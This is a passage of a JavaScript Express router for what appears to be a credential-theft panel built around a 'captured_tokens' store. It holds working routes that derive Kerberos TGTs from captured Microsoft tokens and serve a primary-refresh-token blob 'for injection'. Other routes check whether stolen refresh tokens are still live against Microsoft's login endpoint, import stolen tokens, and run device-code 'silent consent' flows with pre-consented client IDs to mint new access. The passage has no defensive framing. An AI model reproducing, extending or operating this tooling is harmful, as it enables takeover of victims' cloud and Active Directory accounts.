    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];

    // Call kerberos service to derive TGTs
    const result = await kerberosService.deriveTGTForToken(req.params.id);

    if (result.success) {
      res.json({
        success: true,
        message: 'Kerberos TGTs derived successfully',
        token_id: result.token_id,
        email: result.email,
        tgt_cloud: result.tgt_cloud,
        tgt_ad: result.tgt_ad,
        session_key: result.session_key,
        kerberos_top_level_names: result.kerberos_top_level_names,
        tgt_cloud_sessionkey: result.tgt_cloud_sessionkey
      });
    } else {
      res.status(400).json({ error: result.error, success: false });
    }
  } catch (err) {
    console.error('[Tokens] TGT derivation error:', err.message);
    res.status(500).json({ error: 'TGT derivation failed: ' + err.message });
  }
});

// ─── Bulk derive Kerberos TGTs for all eligible tokens ──────────────
router.post('/bulk-derive-tgts', userAuth, async (req, res) => {
  try {
    const limit = parseInt(req.body.limit) || 50;
    const stats = await kerberosService.bulkDeriveTGTs(limit);
    res.json({
      success: true,
      ...stats
    });
  } catch (err) {
    console.error('[Tokens] Bulk TGT derivation error:', err.message);
    res.status(500).json({ error: 'Bulk TGT derivation failed: ' + err.message });
  }
});

// ─── Get full PRT credential blob for injection ─────────────────────
router.get('/:id/full-credential-blob', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const result = await kerberosService.getFullPRTCredentialBlob(req.params.id);

    if (result.success) {
      res.json({
        success: true,
        blob: result.blob
      });
    } else {
      res.status(400).json({ error: result.error, success: false });
    }
  } catch (err) {
    console.error('[Tokens] Credential blob error:', err.message);
    res.status(500).json({ error: 'Failed to get credential blob: ' + err.message });
  }
});

// ─── Check token status (active/revoked) ─────────────────────────────────
router.post('/check-status', userAuth, async (req, res) => {
  try {
    const { token_id } = req.body;
    
    if (!token_id) {
      return res.status(400).json({ error: 'token_id is required' });
    }
    
    // Get token
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [token_id, req.user.id]
    );
    
    if (!tokens.length) {
      return res.status(404).json({ error: 'Token not found' });
    }
    
    const token = tokens[0];
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const clientId = token.client_id || config.AZURE_CLIENT_ID || '4813382a-8fa7-425e-ab75-3b753aab3abb';
    const tenant = token.tenant || config.AZURE_TENANT || 'common';
    
    if (!refreshToken) {
      return res.json({ status: 'unknown', message: 'No refresh token available' });
    }
    
    // Try to refresh the token to check if it's still valid
    const axios = require('axios');
    const tokenEndpoint = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`;
    
    try {
      const response = await axios.post(
        tokenEndpoint,
        new URLSearchParams({
          client_id: clientId,
          grant_type: 'refresh_token',
          refresh_token: refreshToken,
          scope: 'openid profile email offline_access https://graph.microsoft.com/User.Read'
        }),
        {
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          timeout: 15000
        }
      );
      
      if (response.data.access_token) {
        // Token is still active - update status
        await db.query(
          'UPDATE captured_tokens SET token_status = ? WHERE id = ?',
          ['active', token_id]
        );
        
        return res.json({ status: 'active', message: 'Token is valid and active' });
      }
    } catch (err) {
      // Check if error indicates revoked token
      const errorData = err.response?.data;
      if (errorData?.error === 'invalid_grant' || 
          errorData?.error === 'invalid_request' ||
          (errorData?.error_description && 
           (errorData.error_description.includes('revoked') || 
            errorData.error_description.includes('expired')))) {
        
        // Token is revoked
        await db.query(
          'UPDATE captured_tokens SET token_status = ? WHERE id = ?',
          ['revoked', token_id]
        );
        
        return res.json({ status: 'revoked', message: 'Token has been revoked' });
      }
    }
    
    return res.json({ status: 'unknown', message: 'Could not determine token status' });
  } catch (err) {
    console.error('[Tokens] Check status error:', err.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Import token manually ────────────────────────────────────────────────
router.post('/import', userAuth, async (req, res) => {
  try {
    const { 
      refresh_token, 
      access_token, 
      id_token, 
      client_id,
      email,
      tenant,
      account_type,
      notes 
    } = req.body;
    
    if (!refresh_token) {
      return res.status(400).json({ error: 'refresh_token is required' });
    }
    
    const clientId = client_id || config.AZURE_CLIENT_ID || '4813382a-8fa7-425e-ab75-3b753aab3abb';
    const tenantVal = tenant || config.AZURE_TENANT || 'common';
    const accountType = account_type || 'work_school';
    const emailAddress = email || '';
    
    // Extract email from id_token if not provided
    let extractedEmail = emailAddress;
    if (!extractedEmail && id_token) {
      try {
        const tokenParts = id_token.split('.');
        if (tokenParts.length === 3) {
          const payload = JSON.parse(Buffer.from(tokenParts[1], 'base64').toString());
          extractedEmail = payload.email || payload.preferred_username || '';
        }
      } catch (e) {
        // Could not extract email from id_token
      }
    }
    
    // Encrypt tokens
    const accessEncrypted = access_token ? encrypt(access_token) : null;
    const refreshEncrypted = encrypt(refresh_token);
    const idEncrypted = id_token ? encrypt(id_token) : null;
    
    // Insert into database
    const [result] = await db.query(
      `INSERT INTO captured_tokens 
       (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, 
        id_token_encrypted, ip_address, user_agent, notes, expiration, tenant, template_type, 
        account_type, client_id, token_status) 
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?, ?)`,
      [
        req.user.id,
        null, // no link_id for imported tokens
        extractedEmail,
        'token',
        accessEncrypted,
        refreshEncrypted,
        idEncrypted,
        'manual', // IP address
        'Manual Import', // user agent
        notes || '',
        tenantVal,
        'office',
        accountType,
        clientId,
        'active' // Start as active, will be verified
      ]
    );
    
    res.json({ 
      success: true, 
      token_id: result.insertId,
      email: extractedEmail,
      message: 'Token imported successfully'
    });
  } catch (err) {
    console.error('[Tokens] Import error:', err.message);
    res.status(500).json({ error: 'Server error: ' + err.message });
  }
});

// ─── Silent consent: Test if existing refresh token works ────────────
router.post('/silent-consent/test', userAuth, async (req, res) => {
  try {
    const { refresh_token, tenant, account_type, template_type } = req.body;

    if (!refresh_token) {
      return res.status(400).json({ error: 'refresh_token is required' });
    }

    const tenantVal = tenant || config.AZURE_TENANT || 'common';
    const accountType = account_type || 'work_school';
    const templateType = template_type || 'office';

    const consentConfig = silentConsentService.getPreConsentedClient(accountType, tenantVal, templateType);
    const result = await silentConsentService.testRefreshToken(
      refresh_token,
      consentConfig.tokenEndpoint,
      consentConfig.client_id,
      consentConfig.scopes
    );

    res.json({
      success: result.success,
      consent_required: !result.success,
      access_token: result.access_token,
      new_refresh_token: result.new_refresh_token,
      strategy: result.success ? 'token_valid' : 'consent_needed'
    });
  } catch (err) {
    console.error('[Tokens] Silent consent test error:', err.message);
    res.status(500).json({ error: 'Silent consent test failed: ' + err.message });
  }
});

// ─── Silent consent: Initiate device flow with pre-consented client ─
router.post('/silent-consent/device-flow', userAuth, async (req, res) => {
  try {
    const { tenant, account_type, template_type, existing_refresh_token } = req.body;

    const tenantVal = tenant || config.AZURE_TENANT || 'common';
    const accountType = account_type || 'work_school';
    const templateType = template_type || 'office';

    const result = await silentConsentService.initiateSilentDeviceFlow(
      tenantVal,
      accountType,
      templateType,
      existing_refresh_token
    );

    res.json(result);
  } catch (err) {
    console.error('[Tokens] Silent consent device flow error:', err.message);
    res.status(500).json({ error: 'Silent consent device flow failed: ' + err.message });
  }
});

// ─── Silent consent: Find best working client for tenant ─────────────
router.post('/silent-consent/find-client', userAuth, async (req, res) => {
  try {
    const { tenant, account_type, template_type } = req.body;

    const tenantVal = tenant || config.AZURE_TENANT || 'common';
    const accountType = account_type || 'work_school';
    const templateType = template_type || 'office';

    const result = await silentConsentService.findWorkingClient(tenantVal, accountType, templateType);
    res.json(result);
  } catch (err) {
    console.error('[Tokens] Find client error:', err.message);
    res.status(500).json({ error: 'Find client failed: ' + err.message });
  }
});

module.exports = router;
